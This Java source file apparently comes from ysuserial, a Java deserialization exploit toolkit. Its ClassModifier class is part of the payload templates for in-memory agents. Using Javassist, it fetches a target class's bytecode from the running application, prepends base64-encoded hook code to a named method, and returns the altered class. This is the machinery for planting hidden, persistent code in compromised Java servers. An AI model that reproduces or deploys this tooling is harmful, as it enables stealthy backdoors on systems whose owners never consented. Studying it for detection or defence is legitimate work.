package org.su18.ysuserial.payloads.templates.agent.util;

import javassist.*;

import java.util.*;

/**
 * @author su18
 */
public class ClassModifier {

	// Hook 类信息，类名,方法名,方法参数(逗号分隔)
	public static ArrayList<String> HOOK_CLASS_INFORMATION_MAP = new ArrayList<String>();

	// Hook 类方法字符串
	public static String HOOK_METHOD_CODE;

	public static List<Object> insert() {

		// 初始化要 hook 的方法信息
		initHookClassINFORMATION();

		String   classNames = HOOK_CLASS_INFORMATION_MAP.get(0);
		String[] names      = classNames.split(",");
		for (String name : names) {
			try {
				List<Object> classObj = getHookClassBytes(name);

				if (classObj == null) {
					continue;
				}

				String    targetClassName = classObj.get(0).toString();
				byte[]    targetClassBody = (byte[]) classObj.get(1);
				ClassPool cp              = ClassPool.getDefault();
				cp.insertClassPath(new ByteArrayClassPath(targetClassName, targetClassBody));
				CtClass targetClass = cp.get(targetClassName);

				String   methodName = HOOK_CLASS_INFORMATION_MAP.get(1);
				String[] paramList  = HOOK_CLASS_INFORMATION_MAP.get(2).split(",");

				List<CtClass> paramClasses = new ArrayList<CtClass>();
				for (String param : paramList) {
					CtClass ctClass = cp.get(param);
					paramClasses.add(ctClass);
				}

				CtMethod ctMethod = targetClass.getDeclaredMethod(methodName, paramClasses.toArray(new CtClass[paramClasses.size()]));
				ctMethod.insertBefore(base64Decode(HOOK_METHOD_CODE));
				targetClass.detach();

				List<Object> list = new ArrayList<Object>();
				list.add(targetClassName);
				list.add(targetClass.toBytecode());
				return list;

			} catch (Exception ignored) {
			}
		}
		return null;
	}


	private static List<Object> getHookClassBytes(String name) {
		ClassPool classPool = ClassPool.getDefault();

		try {
			// 用 Javassist 获取目标环境中，目标类的类字节码
			classPool.insertClassPath(new ClassClassPath(Thread.currentThread().getContextClassLoader().loadClass(name)));
			CtClass      targetClass = classPool.get(name);
			List<Object> obj         = new ArrayList<Object>();
			obj.add(name);
			obj.add(targetClass.toBytecode());
			targetClass.detach();
			return obj;
		} catch (Exception ignored) {
		}
		return null;
	}

	public static String base64Decode(String bs) throws Exception {
		Class  base64;
		byte[] value = null;
		try {
			base64 = Class.forName("java.util.Base64");
			Object decoder = base64.getMethod("getDecoder", new Class[]{}).invoke(null, (Object[]) null);
			value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
		} catch (Exception e) {
			try {
				base64 = Class.forName("sun.misc.BASE64Decoder");
				Object decoder = base64.newInstance();
				value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
			} catch (Exception ignored) {
			}
		}

		return new String(value);
	}

	public static void initHookClassINFORMATION() {
	}

}
